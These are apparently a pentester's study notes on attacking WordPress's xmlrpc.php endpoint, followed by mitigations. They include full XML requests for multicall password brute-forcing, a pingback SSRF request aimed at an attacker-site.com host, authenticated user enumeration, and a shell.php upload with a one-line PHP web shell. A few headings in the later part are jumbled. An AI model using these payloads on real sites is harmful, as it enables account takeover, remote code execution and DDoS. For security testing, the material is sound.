# 🧠 WordPress XML-RPC – Pentesting Notes

---

## 📌 What is `xmlrpc.php`

- Endpoint:
  
      /xmlrpc.php

- Used for **remote communication** with WordPress via XML-RPC protocol  
- Legacy alternative before REST API  

### 🔹 Legit Uses

- WordPress Mobile App  
- Jetpack plugin  
- Trackbacks / Pingbacks  
- Remote publishing tools  
- Third-party integrations  

---

## 🔍 Step 1: Detect XML-RPC

### ✔️ Basic Check

      GET /xmlrpc.php

### ✅ Expected Responses

- `405 Method Not Allowed`  
- OR  
- `XML-RPC server accepts POST requests only`  

👉 Confirms endpoint exists  

---

## 🔎 Step 2: Enumerate Methods

### ✔️ Request → `system.listMethods`

      POST /xmlrpc.php HTTP/1.1
      Host: example.com
      Content-Type: text/xml

      <?xml version="1.0"?>
      <methodCall>
        <methodName>system.listMethods</methodName>
        <params></params>
      </methodCall>

---

## 📥 Expected Response

If XML-RPC is enabled:

      HTTP/1.1 200 OK
      Content-Type: text/xml

      <methodResponse>
        <params>
          <param>
            <value>
              <array>
                <data>
                  <value><string>system.multicall</string></value>
                  <value><string>system.listMethods</string></value>
                  <value><string>system.getCapabilities</string></value>
                  <value><string>wp.getUsersBlogs</string></value>
                  <value><string>wp.newPost</string></value>
                  <value><string>pingback.ping</string></value>
                </data>
              </array>
            </value>
          </param>
        </params>
      </methodResponse>

---

## 🎯 What This Tells You

- XML-RPC is **enabled**
- Available attack surface is visible
- Plugin-added methods may also appear

---

## 🛠️ Useful Methods for Pentesting

| Method | Purpose |
|--------|--------|
| `system.listMethods` | Enumerate all methods |
| `system.multicall` | Send multiple requests in one |
| `wp.getUsersBlogs` | Login/auth check |
| `pingback.ping` | Trigger pingback (DDoS/SSRF) |
| `metaWeblog.newPost` | Create posts |
| `wp.uploadFile` | Upload files |

# 🚨 1. XML-RPC Brute Force Attack

## 🔥 Vulnerable Method

      wp.getUsersBlogs

---

## 💡 Why It Works

- Accepts **username/password**
- No strict rate limiting
- Can be abused with `system.multicall`

👉 Unlike `/wp-login.php`, this allows **batch login attempts**

---

## 🧪 Example Attack (Multicall)

      <?xml version="1.0"?>
      <methodCall>
        <methodName>system.multicall</methodName>
        <params>
          <param>
            <value>
              <array>
                <data>

                  <value>
                    <struct>
                      <member>
                        <name>methodName</name>
                        <value><string>wp.getUsersBlogs</string></value>
                      </member>
                      <member>
                        <name>params</name>
                        <value>
                          <array>
                            <data>
                              <value><string>admin</string></value>
                              <value><string>password123</string></value>
                            </data>
                          </array>
                        </value>
                      </member>
                    </struct>
                  </value>

                </data>
              </array>
            </value>
          </param>
        </params>
      </methodCall>

---

## ⚠️ Why This Is Dangerous

- One request = **hundreds of login attempts**
- Bypasses traditional rate limiting
- Harder to detect in logs

---

# 🌐 2. Pingback DDoS / SSRF

## 🔥 Vulnerable Method

      pingback.ping

---

## 💡 What Happens

- WordPress sends a request to another URL
- Used to verify backlinks

👉 Can be abused for:
- **DDoS amplification**
- **SSRF**

---

## 🧪 Example Request

      <?xml version="1.0"?>
      <methodCall>
        <methodName>pingback.ping</methodName>
        <params>
          <param>
            <value>
              <string>http://attacker-site.com/post</string>
            </value>
          </param>
          <param>
            <value>
              <string>http://victim.com/blog-post</string>
            </value>
          </param>
        </params>
      </methodCall>

---

## ⚠️ Why This Is Dangerous

- Triggers **outbound requests**
- Can hit internal services (SSRF)
- Can flood targets (DDoS)

---

# ✅ Quick Testing Checklist

- [ ] `/xmlrpc.php` accessible  
- [ ] `system.listMethods` works  
- [ ] `system.multicall` enabled  
- [ ] `wp.getUsersBlogs` responds  
- [ ] `pingback.ping` enabled  

---

# 🛡️ Mitigation (For Reports)

- Disable XML-RPC if not needed  
- Use WAF rules to block `xmlrpc.php`  
- Disable `pingback.ping`  
- Implement rate limiting  
- Use strong passwords / MFA  

---

# 🧾 Key Takeaways

- XML-RPC = **hidden attack surface**
- `system.multicall` = brute force booster
- `pingback.ping` = SSRF + DDoS vector
- Always test this during WordPress pentesting

# 👤 3. User Enumeration via XML-RPC

## 🔥 Method

    wp.getAuthors

---

## 📌 What It Does

- Returns list of users with **author-level or higher privileges**
- Helps identify **valid usernames**

### Returned Fields

| Field          | Description            |
|----------------|------------------------|
| user_id        | WordPress user ID      |
| user_login     | Username               |
| display_name   | Public display name    |

---

## 🧪 Example Request

    POST /xmlrpc.php HTTP/1.1
    Host: example.com
    Content-Type: text/xml

    <?xml version="1.0"?>
    <methodCall>
      <methodName>wp.getAuthors</methodName>
      <params>
        <param><value><int>1</int></value></param>
        <param><value><string>admin</string></value></param>
        <param><value><string>password</string></value></param>
      </params>
    </methodCall>

---

## ⚠️ Note

- Authentication is required  
- Useful **after initial access / credential discovery**

---

## 📥 Example Response

    <methodResponse>
      <params>
        <param>
          <value>
            <array>
              <data>
                <value>
                  <struct>
                    <member>
                      <name>user_id</name>
                      <value><string>1</string></value>
                    </member>
                    <member>
                      <name>user_login</name>
                      <value><string>admin</string></value>
                    </member>
                    <member>
                      <name>display_name</name>
                      <value><string>Administrator</string></value>
                    </member>
                  </struct>
                </value>
              </data>
            </array>
          </value>
        </param>
      </params>
    </methodResponse>

---

# 🎯 Why This Matters in Pentesting

Even though authentication is required:

### 🔹 Real Attack Scenario

1. Brute force via `system.multicall`  
2. Gain access to one account  
3. Use `wp.getAuthors`  
4. Enumerate all users  
5. Target higher-privileged accounts

# 📤 4. File Upload Abuse via XML-RPC

## 🔥 Method

    wp.uploadFile

---

## 📌 What It Does

- Uploads files to:

      /wp-content/uploads/YYYY/MM/

- Accepts files in **Base64 format**

---

## 📥 Parameters

| Parameter | Description              |
|----------|--------------------------|
| blog_id  | Usually 1                |
| username | WordPress username       |
| password | WordPress password       |
| name     | File name               |
| type     | MIME type               |
| bits     | Base64 encoded content  |
| overwrite| Overwrite existing file |

---

## 🧪 Example Upload Request

    <?xml version="1.0"?>
    <methodCall>
      <methodName>wp.uploadFile</methodName>
      <params>
        <param><value><int>1</int></value></param>
        <param><value><string>admin</string></value></param>
        <param><value><string>password</string></value></param>
        <param>
          <value>
            <struct>
              <member>
                <name>name</name>
                <value><string>shell.php</string></value>
              </member>
              <member>
                <name>type</name>
                <value><string>application/octet-stream</string></value>
              </member>
              <member>
                <name>bits</name>
                <value><base64>BASE64_DATA_HERE</base64></value>
              </member>
            </struct>
          </value>
        </param>
      </params>
    </methodCall>

---

## 📥 Example Response

    <methodResponse>
      <params>
        <param>
          <value>
            <struct>
              <member>
                <name>id</name>
                <value><string>125</string></value>
              </member>
              <member>
                <name>file</name>
                <value><string>shell.php</string></value>
              </member>
              <member>
                <name>url</name>
                <value>
                  <string>https://example.com/wp-content/uploads/2025/05/shell.php</string>
                </value>
              </member>
            </struct>
          </value>
        </param>
      </params>
    </methodResponse>

👉 Reveals uploaded file path

---

# ⚠️ Possible Attacks

## 1. Web Shell Upload

If execution is allowed in `/uploads`:

    <?php system($_GET['cmd']); ?>

Access:

    https://example.com/wp-content/uploads/2025/05/shell.php?cmd=id

---

## 2. Malicious File Upload

Attackers may upload:

- Backdoors  
- Reverse shells  
- Malware  
- Phishing pages  

---

## 3. Polyglot File Attacks

Bypass filters using:

    image.php.jpg
    shell.jpg.php

Or embedding PHP inside images

# ⚠️ Common Security Risks

## 1. Information Disclosure

Some plugins expose internal data through XML-RPC responses.

### 🔍 Examples

- User emails  
- Usernames  
- API keys  
- Plugin configuration  
- Internal paths  

### 🧪 Example Vulnerable Response

    <member>
      <name>database_user</name>
      <value><string>wp_admin</string></value>
    </member>

👉 Can help attackers in **further exploitation**

---

## 2. Unauthenticated Actions

Poorly written plugins may allow actions **without authentication**

### 🔍 Examples

- Creating posts  
- Editing content  
- Uploading files  
- Triggering administrative tasks  

### 🧪 Example Vulnerable Method

    plugin.createPost

👉 If authentication is missing → attacker can **publish malicious content remotely**

---

## 3. Weak Authentication Checks

Some plugins only verify:

    username exists

instead of verifying:
- Password  
- User capabilities  

### 🧪 Example Vulnerable Logic

    if (username_exists($username)) {
        return true;
    }

👉 Leads to:
- Authentication bypass  
- Privilege escalation  

---

## 4. Arbitrary File Operations

Some plugins expose dangerous methods:

    plugin.uploadFile
    plugin.importData
    plugin.exportConfig

### ⚠️ If validation is weak, attackers may:

- Upload malicious files  
- Access sensitive backups  
- Modify site configuration

- XML-RPC hooks  
- Authentication logic  

---

## 4. Use Security Plugins

### 🔐 Examples

- Wordfence

- Disable XML-RPC

# 🚫 When XML-RPC is Disabled

### 📥 Example Response

    <fault>
      <value>
        <struct>
          <member>
            <name>faultCode</name>
            <value><int>405</int></value>
          </member>
          <member>
            <name>faultString</name>
            <value>
              <string>XML-RPC services are disabled on this site.</string>
            </value>
          </member>
        </struct>
      </value>
    </fault>

---

## 🔍 Possible Causes

- Security plugin disabled XML-RPC  
- `.htaccess` blocking  
- WAF rules  
- Hosting provider restriction  

---

# 🛠️ Mitigation Strategies

## 1. Disable XML-RPC

### `.htaccess`

    <Files xmlrpc.php>
        Require all denied
    </Files>

---

## 2. Disable Pingbacks Only

Add to `functions.php`:

    add_filter('xmlrpc_methods', function ($methods) {
        unset($methods['pingback.ping']);
        return $methods;
    });

---

## 3. Use Security Plugins

- Wordfence  
- Disable XML-RPC  
- iThemes Security  

---

## 4. WAF Protection

### 🔐 Use Firewall Rules

- Cloudflare  
- ModSecurity  
- Nginx rate limiting
